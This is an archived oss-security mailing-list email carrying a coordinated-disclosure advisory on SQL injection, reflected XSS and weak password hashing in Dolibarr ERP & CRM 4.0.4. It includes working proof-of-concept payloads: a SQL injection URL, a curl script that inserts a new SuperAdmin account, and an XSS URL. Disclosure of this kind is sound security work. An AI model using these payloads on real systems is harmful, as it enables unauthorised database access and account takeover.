X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6261" "Wednesday" "10" "May" "2017" "10:28:29" "+0200" "FOXMOLE Advisories" "advisories@foxmole.com" "<24585059-6758-7cd1-f142-8c56a1a9ffb8@foxmole.com>" "177" "[oss-security] Dolibarr ERP & CRM - Multiple Issues" nil nil nil "5" "2017051008:28:29" "[oss-security] Dolibarr ERP & CRM - Multiple Issues" (number mark "U       advisories@f May 10  177/6261  " thread-indent "\"[oss-security] Dolibarr ERP & CRM - Multiple Issues\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 16125 invoked by uid 550); 10 May 2017 13:35:57 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 20114 invoked from network); 10 May 2017 08:28:45 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=Keyldentity.onmicrosoft.com; s=selector1-foxmole-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version;
 bh=0XlNNkJak+i5g3jBOqBGH/veNInTCA1bXtLilTbM3zY=;
 b=CeVvjCfjEAuoOfmj6IysMjjPEYTePQuWBAifHFOPOAJ9kTOWaKMdfCY8+12oeQd29J33mxD+Udyg+fxy3dE01at+TE7gwZ6DrVsBQMZ1BJId9ZwlVrWR325Iy00fwPwh7URt7pulK3k+ZqFjl7/JD4Fn6z2FCpRAumVeXZ0znFw=
Authentication-Results: lists.openwall.com; dkim=none (message not signed)
 header.d=none;lists.openwall.com; dmarc=none action=none
 header.from=foxmole.com;
From: FOXMOLE Advisories <advisories@foxmole.com>
To: <oss-security@lists.openwall.com>
Message-ID: <24585059-6758-7cd1-f142-8c56a1a9ffb8@foxmole.com>
Date: Wed, 10 May 2017 10:28:29 +0200
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
 Thunderbird/45.8.0
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature";
	boundary="uhLAO7tCGA6aW47bpMlvtw7rMRHH0oxSC"
X-Originating-IP: [31.24.175.118]
X-ClientProxiedBy: DB5PR08CA0050.eurprd08.prod.outlook.com (10.166.166.146) To
 HE1P193MB0057.EURP193.PROD.OUTLOOK.COM (10.171.125.16)
X-MS-PublicTrafficType: Email
X-MS-Office365-Filtering-Correlation-Id: 39990b31-322d-4f2e-62d0-08d4977e8b96
X-Microsoft-Antispam:
	UriScan:;BCL:0;PCL:0;RULEID:(22001)(201703131423075);SRVR:HE1P193MB0057;
X-Microsoft-Exchange-Diagnostics:
	1;HE1P193MB0057;3:i4N7sK/Te4ET0khLvBRVVwE69lPvHoVZJxQh6FQRxHsH11FS92UqWa+yEb0Dxt8RH8wXyQgvMrgJMR4Uk/0S76fFLrbcDORc3Y9CR1TFmkbp6OOKZ+VLMj03uMv4EmS+NhDxurpe2ZSOxEeTQ408B0703Jc5pq9RTgY0VC5tlthg2EIbk/StAbzEZie9iZK76BKl1aKTYjvgK5jFSxXzQjY9b7ssU7O8mqKgcSADW7/3ZeSC3DfnnbEsf7AokODSjRoE2c/0nWEFj01qlpZaSn5jrdrjObsRqOfhFSNJjos=;25:MxNxhc5IvxDQm1FyaJ7Rw3/1n6lGlkOhz4sH7my0gr8AiRI2AvFDPfZQmekGFl5d9rTUzncxISr1jQAceEXjoX448ffIAdiqSDQRyMVoZyMPiqxkDfbVEEJGqDmYIsS79a79TZ/iTP8yfsZ9NUbHdNWFq6Ox5FvMZFG2jvDWtgMwu1XWIC1EJ/4pAjmNvrLOLEYlwmrx+yAUwn6AK44amCZHZxJU6qBIGhvQZpZVONm7/5wmCBKxNDFamrxxgYKEUN0UnsByVocAWZwXbBGZ7N8lEMMgi/kUEgKdCPEJcGsrwpFsSs/jX7W9daeR7OqrQQzJbO3BkHmAIdFIxoCL9gCIGmSPfwaJKcNMf6VfE67/tqJhWPEQ1fdcHxuRyE7mtsHSCu+nHV68RJc35LNrEnyTPT2jG1S7+x82+AvzEYV5rSNkyXpcJIMskdTQk9rTGCsoOyDg5pR0GTbDW6bXVbeiB4a4ha8fsDwYpPtCWCk=
X-Microsoft-Exchange-Diagnostics:
	1;HE1P193MB0057;31:wzmcw2AKbSLnKAiCQ9kXe1NsjgHEWHAkcGiPHxi/0tM63Wm10ihr/VIxiqlREkIEi6NIUT3rUClYMOH9ssA3YVYk3Y5pV6wvMjVg2YBogNCYBhUx1gase0BHZn78lKE6UfAIu0Js3gDFiSWt0yTlmKEA+Iky5qA7TiTIkHMFSpwP/2X74A1PS5AL4EXzGUaMIA4YEl4iKiN6ZW7DnQk9zD8RKpFdC6tIhjnfjcqzVdy5EGAQ7fW1nH1+ZFR1PRYGExx5a1EF4nbgFY5Q7F1dmg==;20:ghARU5zSXl8wEMW49Us/O2S4jp9zvwrPJQGjeJsPuN4Z+Pq4A3lVx/nZpWd+aQ6qp4O9qTiSvPUhTnFdfGynmcrdBcjjbF92Eon3m4czMAK1UhIJ3i5zsxhMRoQ5bIsap4fT5uyoTvr/yYlXLI4QQNjIBhRnqXH/yLpa0HekO+OtS+ubbu4EUHeGJNcFUpzwkg5wGFO4d3x8hOb0l9F5JKtaLq0nUmj7nJspwVTF0udyS/xJfXeivTMty/Z5OCqv9BF5gJ0T49HpTCyaMGDYOwKr+HuuYtC2yuRxj7XeoRBl/3a/yYiU7cSAgyGgaLfYH57PhVcN01cPc9QiFZIO+ziVPNAJzW4ZGXcM+ti8SJQVcq02EHJnKUJAfV9ts1OeCbD2XIx6Phk/kD1bPOmtsCwVd5ywfnikSqboCJSzpTPpkW/6tM44hli3QKkesJkxuJsvZ0rD+mUjhjPrXcA9ooDXwMIGXX7zzashIyWcscsWRWNcWWJ4rVFZaYuSSJCo
X-Microsoft-Antispam-PRVS:
	<HE1P193MB005795E96692A2997E80670FC4EC0@HE1P193MB0057.EURP193.PROD.OUTLOOK.COM>
X-Exchange-Antispam-Report-Test: UriScan:(76373721406558)(192374486261705);
X-Exchange-Antispam-Report-CFA-Test:
	BCL:0;PCL:0;RULEID:(6040450)(2401047)(8121501046)(5005006)(10201501046)(3002001)(93006095)(93001095)(6041248)(20161123558100)(201703131423075)(201702281528075)(201703061421075)(201703061406153)(2016111802025)(20161123555025)(20161123560025)(20161123564025)(20161123562025)(6043046)(6072148);SRVR:HE1P193MB0057;BCL:0;PCL:0;RULEID:;SRVR:HE1P193MB0057;
X-Microsoft-Exchange-Diagnostics:
	1;HE1P193MB0057;4:xV3mnHdfoRq9BrBeDvihit5S+udjE0h2/WJqaZH46ZE2ROuA3WgTXfkaFpv+47t4ZVu6L2TN7PvMx7zas1MDi7RXDZykOWBiMu5Om7Cc31c7C4BWyTRvop7wmCP5LOGHzq/1joVn9rTaR30WPMkTV9pJJdccd962Y2HD65LeyVfSai7p6tOuC95xxhDR1uvqmJ6OFl53ky54e92SYPf8Jnpb876uas0P1rUXUeO6Wep9gFVgNqDdJaJDEC4AV8Atnsyd/VSDPUVSq+QJPL1iLkbSn9CsR42qgH66FptIAn2PXJtOTopmM1Czyjgyc3Yuy33d9ogWqPwxo8dZvL0Nk2ZiVpv2MM+LIlGjugjGwBskDQpesIjhbqd3uG8fF2UR9YLDyjhdmYZ9gB22ivz/t7ZChcUUTXVxMTSEGr38ChNJOa6T+VzXtPhr2laHH0IWnInMLxbk6ELvBeWz6vo+6/FmGnzaJI3Gz8KYTNM0pd5b00gIChIdd8S1RgUbUpES0L4K6aDz7QkjAsBjBYVgkudSfymotIjAmoT2HPiw51PfbqcX4cpCzv08ACuZyE21PtiejSobqdGoJrgsOBbozSk/gv4d8cGYiwR5FxpDh11HAEhQJdOKraH4b+Aix9spBmwf6U7v6zPHUR5hxJymUAztBUIWVwgkuLUunc/tC/uMKf8Q/A76D+inITN8OFMhi+4cP5EsZ1K4WHeU6myuMeO8nqcJWRFUosqglxCvMwJq1LTZDmvs7pa8+oz/j7Ine+IL2qKsRDeo2rkZUtLHPRXn6Kv9vJNWXSZFwIcccQIjR5/r4BCdU0Z5LtCLuQgn5EoA5fQ0nGbyGfW4IjS2asqo0h2kwIEa30VBi5liVAdboFaa+ysujykIYuxAFO8wdC1wCrU54l6qpA5b16EQyA==
X-Forefront-PRVS: 03030B9493
X-Forefront-Antispam-Report:
	SFV:NSPM;SFS:(10019020)(4630300001)(6009001)(6019001)(6049001)(39840400002)(39410400002)(39450400003)(39400400002)(269900001)(377424004)(81166006)(50986999)(54356999)(2906002)(7736002)(305945005)(42186005)(551544002)(2351001)(8676002)(36756003)(31686004)(38730400002)(512874002)(5890100001)(86362001)(575784001)(25786009)(84326002)(65826007)(110136004)(31696002)(83506001)(5660300001)(478600001)(966004)(53936002)(16799955002)(189998001)(64126003)(6306002)(6666003)(6486002)(77096006)(6916009)(6116002)(3846002)(568964002)(66066001)(4001350100001)(15188155005)(65956001)(33646002)(21480400002)(10721665003);DIR:OUT;SFP:1102;SCL:1;SRVR:HE1P193MB0057;H:[10.78.115.101];FPR:;SPF:None;MLV:sfv;LANG:en;
X-Microsoft-Exchange-Diagnostics:
	=?us-ascii?Q?1;HE1P193MB0057;23:qxkHRnYvrarE+0YT4CU52ln6c+FMST4G1HhWrnkWk?=
 =?us-ascii?Q?4fxzWQlh9ewGTfGpVbBfNqmxa3tzS9/+4aKY7xK6fbj32KNDc/qzcCoYoZ1e?=
 =?us-ascii?Q?CDDRFgBkUXA0qMxCBES5XhxRLQftalR71/Bdc9jKmzJf+GXUiupnr34vvYHz?=
 =?us-ascii?Q?LkeFGW6GSrcrjxheUuMcvO/+UU0Ab7sy1PurVDRJ02qqSlBODWiksJXMRn7D?=
 =?us-ascii?Q?RkCvm6h0bdMDVmw2LJkIyzrjeeUvOhszrv/fZphbDGBJdpdx9sO9UVpKy710?=
 =?us-ascii?Q?0pLG6D7la2xNbP/8stkNBAbih4qkqyy59m4DaRV3Lf0vM09p1K7FrbgYQRWh?=
 =?us-ascii?Q?yY9NIzlYYXWg/fWStrInMDOjK9BUyBf1A5c8NXpfl5JQuACF1jHz44lrLNSn?=
 =?us-ascii?Q?aZJ8D4rpjrFJT3BcdcFMMi/tErxI1Kmu0Lpay8NZspMu56jvO0zsTYV68lzX?=
 =?us-ascii?Q?CBsZ/zSbhjn49DfJGWagM7xmCg0YPcFE3IruTjqQ8MAcb/y/4TKNTWk0wl+2?=
 =?us-ascii?Q?adXYCeKyxTWztNMZPYYvRAvtFn1IfH5PwcFOQL9LvUZIZ4iK8uKDWeLgjS79?=
 =?us-ascii?Q?EzsIUwEua40b7s+chdZW+N1Oa9gKU//S+uSIpP7SMu1lJ7I4VzxZY/WXrf18?=
 =?us-ascii?Q?O4aLbU/HFNPU4BEHYXOwUQzNjQXVBL37p0CyagLqCyT2RjyP9WAXfrb/iWXh?=
 =?us-ascii?Q?zQQ04g/ZGUwaxNT6gt9L/jEdtaIycMx5GZnjmmhpC9h5MQ68QTon/RR1Y+1v?=
 =?us-ascii?Q?yxQA5BnZ9c/p6d49aX61apxwxeKSjlIUQtZkLZ3FmNMtYWQC5l1ymU1C1uib?=
 =?us-ascii?Q?2kk3GnfvR1gNCZW2HqHOXdk4N63tNED0PZ0RlZRL6Ff6iNfjnvlhinCbpL8P?=
 =?us-ascii?Q?f1y/US3Y5yndnEVkxGXqbb/n1WFOyNm292UUTsfLKn5iBRXHnLfauYrlm02Q?=
 =?us-ascii?Q?qJCDCHXridFVi7aLLGZk9iZJI1a26XqOSKxCJYmJQp0CWfdp4JSdq+yc2DWV?=
 =?us-ascii?Q?wQum8++1TRoYMUHlK6WoJaqcOZKutnMjAionEbKY0bhGgigJx9maMRWqrhI/?=
 =?us-ascii?Q?0OBMLqcYCsizcsFGuwHXS6TLZVoLzyMht8XFjLoerTiOXFzgmUQRo5sFgLOA?=
 =?us-ascii?Q?oSsbZ3frCWm78Pwyq+4KoZ84SUBsK3xOumuGBOTg66g6uDtCrLsHRI/YT0tO?=
 =?us-ascii?Q?ZVvJAGLw2QvP4He/Nj22VSDu1frVDfCLD28xKol6fQYjmwvOPuLQ/trphH6n?=
 =?us-ascii?Q?BGb1JSfSf7FLCRBcAceTOB8R3Xjek/RBklhxTQeo/XCRjkfrY+ATRuybxPak?=
 =?us-ascii?Q?VHXWEFoSsQFaXoRbmChij+QVtqDuV7ZcQjurZeeOuKyXLTuApaKMo3bT6aPd?=
 =?us-ascii?Q?y1QGVt+zrPGlzCkLeTd1qyJxf0=3D?=
X-Microsoft-Exchange-Diagnostics:
	1;HE1P193MB0057;6:pHcrEIhbaRhBNwD9+HuLqzxaYocRMXoUwGcY9RYO2hX+CIhHF9pflyIYgUehxv2t+88aj/+OSmOftBQnGgx089DrHtOl07mc+XBOjf+1o05ncd+smgLK51wrsNEphlTTQBHfEK1MD23WbByRLqk9zackPRVkTdwzA9sLi/sSwv6yilEr0HY0U7aWIp/w2y2Zc4kw1MTv6K09Y8BW8/MQZ89GyyUmx5jtcLqCn/2MC5d/+SBh1w38yvg24YkErvwn2JOcf9GnfojFZ0u1sEl5qoK8x9SmshYfkmO2Q3g9rZ/q7XXdKja5MtBaZJKYh+EsjfTypuU24+Zpg38Khmrg1xnMcIrfZHM8j01khHP6Qxb0sC5gZhkAPoMqG+e3HM5KL4RM/Cpux4/qDkbhsb4akXFRKAI7NnsV/Mgx/7Og2Ea+yzGurHm9MEugSez7hRhro1vAhhNV4NAeRHPB5JwUD9VtVjRPmru3/O7sZgcia1cCgUITqjQ3NNNlR+ZUs2EFh3HFNHETssW9vbHM5pzpv/eKZIVwMuMWo8xsDpHb2ZP/b6f0bDJ1gckbF4zGl2NI;5:tMbeN/0pvh3HOHxX9ps+psPFKNJBMu4/zY5m1mu7raW1lcGdUFziPm2kCrvaL+NvzK2j/dXs+2C+iLGkPDNCGKb/5nw84hxNAUKlBpXYRngUhnA+W8pTTd6excpHS3fRnV6YT9GDNGvL69DXyu3I4w==;24:zEkeCtu8ax+bUI8nCWhSHE9N3WV5bYcc0GVEPSUb+3Nm++xZgNHiAQeERNcm4Ot1lt4BWTIzYATSmZdamBJgMth2YoPIkhZ01oxSaOQSBEU=
SpamDiagnosticOutput: 1:99
SpamDiagnosticMetadata: NSPM
X-Microsoft-Exchange-Diagnostics:
	1;HE1P193MB0057;7:gTMaMHTRi3TSYUWXdQGNsvKiT7agCDfsoJ4C/Gg32uQNaaTIXvtvKG1DAW4tM9xRcVzaVbMa7g5QSu79/YQ896ZSzFP3zfGo5ZG8gGEXqn4q0cebbhQ5dkacSeVpTbLJkFlc42MSFPtlYofJC1RVNPVbaepLq+KolWWXE/H+ewC0FINCPChrDpZW6EJPzOdJGFLbrkfEPHf8wMczUCeWtwn3qXeZJy8IDLWHL5sYM1zxkTYJq1tvp3gpeUQKmbV6aVGwE0Rlpez7vDDtow6ECt7K9s2PI3/jZdCHdqJpEoZ/4T5B5MNWLt9lLryfV1RGjR95FSEa96zq9djZj4NpqA==
X-OriginatorOrg: foxmole.com
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 10 May 2017 08:28:32.7232 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-Transport-CrossTenantHeadersStamped: HE1P193MB0057
Subject: [oss-security] Dolibarr ERP & CRM - Multiple Issues

--uhLAO7tCGA6aW47bpMlvtw7rMRHH0oxSC
Content-Type: multipart/mixed; boundary="Xh1l5wE8l2NdM4mdURBVKopsRvUxnQFaF";
 protected-headers="v1"
From: FOXMOLE Advisories <advisories@foxmole.com>
To: oss-security@lists.openwall.com
Message-ID: <24585059-6758-7cd1-f142-8c56a1a9ffb8@foxmole.com>
Subject: Dolibarr ERP & CRM - Multiple Issues

--Xh1l5wE8l2NdM4mdURBVKopsRvUxnQFaF
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

=3D=3D=3D FOXMOLE - Security Advisory 2017-02-23 =3D=3D=3D

Dolibarr ERP & CRM  - Multiple Issues
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Affected Versions
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Dolibarr 4.0.4

Issue Overview
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Vulnerability Type: SQL Injection, Cross Site Scripting,
                    Weak Hash Algorithm without Salt, Weak Password Change =
Method
Technical Risk: critical
Likelihood of Exploitation: medium
Vendor: Dolibarr
Vendor URL: https://www.dolibarr.org/
Credits: FOXMOLE employees Tim Herres and Stefan Pietsch
Advisory URL: https://www.foxmole.com/advisories/foxmole-2017-02-23.txt
Advisory Status: Public
OVE-ID: OVE-20170223-0001
CVE Number: CVE-2017-7886, CVE-2017-7887, CVE-2017-7888
CVE URL: https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=3D2017-7886
         https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=3D2017-7887
         https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=3D2017-7888
CWE-ID: CWE-79, CWE-89, CWE-327, CWE-620, CWE-759
CVSS 2.0: 10.0 (AV:N/AC:L/Au:N/C:C/I:C/A:C)


Impact
=3D=3D=3D=3D=3D=3D
There are SQL injection vulnerabilities, exploitable without authentication.
An attacker could use the SQL Injection to access the database in an unsafe=
 way.
This means there is a high impact to all Dolibarr installations.
The passwords in the database are stored as MD5 hashes which means they are=
 easily crackable.
The Dolibarr software also lacks input validation resulting in different re=
flected XSS vulnerabilities.

Information
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
We only provide examples for issues, there are quite more.
It is really important to check the whole application for further vulnerabi=
lities.
We want that developers change the overall security according to security b=
est
practices instead of fixing only particular issues.

Issue Description
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

All items tested using FF52.

1.) SQL Injection in style.css.php (CVE-2017-7886)
Authentication Required:No

PoC:
http://192.168.241.143/doli/theme/eldy/style.css.php?lang=3Dde%27%20procedu=
re%20analyse(extractvalue(rand()%2cconcat(concat(0x3a,CURRENT_USER())))%2c1=
)--%201


PoC creating a new admin user via SQL Injection:

###########################################################################=
#######
#!/bin/bash
URL=3D"http://192.168.19.19/theme/eldy/style.css.php?lang=3Dde%27%3BINSERT%=
20INTO%20\
llx_user%20VALUES%20(424242%2C%200%2C%20NULL%2C%20NULL%2C%201%2C%200%2C%20%=
27\
1984-01-01%2000%3A00%3A00%27%2C%20%271984-01-01%2000%3A00%3A00.000%27%2C%20=
NULL\
%2C%20NULL%2C%20%27newadmin%27%2C%20NULL%2C%20%2761529519452809720693702583=
126814\
%27%2C%20NULL%2C%20NULL%2C%20%27%27%2C%20NULL%2C%20%27SuperAdmin%27%2C%20%2=
7%27\
%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20NULL%2C%20NULL%2C%20%27%27%2C%20%=
27\
%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%201%2C%2=
01%2C\
%201%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20%27%27%2C%20%27\
2017-03-10%2000%3A00%3A00%27%2C%20%272017-03-10%2000%3A00%3A00%27%2C%20NULL=
%2C\
%20%27%27%2C%20NULL%2C%201%2C%20NULL%2C%20NULL%2C%20%27%27%2C%20NULL%2C%200=
%2C\
%20%27%27%2C%200%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL)%3B--%27"

curl -s ${URL}
###########################################################################=
#######

The script creates the user 'NEWADMIN' with password 'ximaz'.


2.) Cross Site Scripting Reflected (CVE-2017-7887)
http://192.168.241.143/doli/societe/list.php?sall=3Dasd%3Cscript%3Ealert(%2=
2xss%22)%3C%2Fscript%3E

3.) Passwords stored using MD5 hashes (CVE-2017-7888)
The application stored the passwords using the MD5 hash algorithm without a
salt. The MD5 hash is easily crackable.

dolibarr=3D# SELECT login,pass_crypted FROM llx_user;
 login |           pass_crypted
-------+----------------------------------
 admin | 21232f297a57a5a743894a0e4a801fc3

4.) Unsafe password change method
A user can change his password without entering the recent one.



Temporary Workaround and Fix
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D
FOXMOLE advises to restrict the access to all vulnerable Dolibarr systems u=
ntil all vulnerabilities are fixed.



History
=3D=3D=3D=3D=3D=3D=3D
2017-02-15  Issue discovered
2017-03-06  Vendor contacted
2017-03-27  informed Vendor about disclosure date (2017-05-10)
2017-04-18  added CVE Numbers
2017-05-10  Advisory Release


GPG Signature
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
This advisory is signed with the GPG key of the FOXMOLE advisories team.
The key can be downloaded here: https://www.foxmole.com/advisories-key-3812=
092199E3277C.asc



--Xh1l5wE8l2NdM4mdURBVKopsRvUxnQFaF--

--uhLAO7tCGA6aW47bpMlvtw7rMRHH0oxSC
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEEjrQMZqTYqiY2IftqOBIJIZnjJ3wFAlkSzy0ACgkQOBIJIZnj
J3y4SQ/5AakBh6LY4Iiv70tyuWiceNe2okNwHtsuxsdzBP4NavIhWrkPtcR29Gsb
YZRwUHuj2RHFAafRRN47P/nuabfWH2gJki+H+iFsnw7shA2i+jX903GTyP2yFTZx
6+LsEabdyUTOD5Ha9TNDOI6ubzVBZvFZMPhIfVGqHaY3StsgmvrmnjlKzI9AaevI
N5RiP7fwPk6LIfuP2KrOsHOTalSalzgkf25WiNq6uqbtmNrUVrrKU/0Zd5I7+78c
oh9g09Ka9i3bhkT6bKYmhRyb6xPQPFiKpsEw6MXDqy+RHtw2UZWtigS/yX1OmOLI
XBaaeYNayjmKDVmevbcSgO4tK68XiWYx36nqCrFPAdhduAMX4LM0qMjaCs3GZs0B
tagauSlOajEgrlCowEmoQDdjSOrTDdom2QK+8vp7c1cNAqzNDUwXSslOtKS6F3iD
F1XvjqEVH9hSsEi0Y13cb3EFbCgqEzenA3AMiv4rrzCDV0/mKGkcthMK5oYL/2/f
huzOfZIg2RAJ7jHAMkrgGjfvHOL4Ai4t31qBq1UvsEKgacJ59bn4yiE5MC/qfLyf
Bf6TiRUqeJONWpLNPoUcTejsJ1jqcWpjj1ljyvfYK2tDDxTTN+G3Z22aMMrc/NdK
2pIQuBgqF59c7EtT/CCb9+yQq8fDF8AgCrVBW7RnxGM2A1mZWJc=
=SGB0
-----END PGP SIGNATURE-----

--uhLAO7tCGA6aW47bpMlvtw7rMRHH0oxSC--
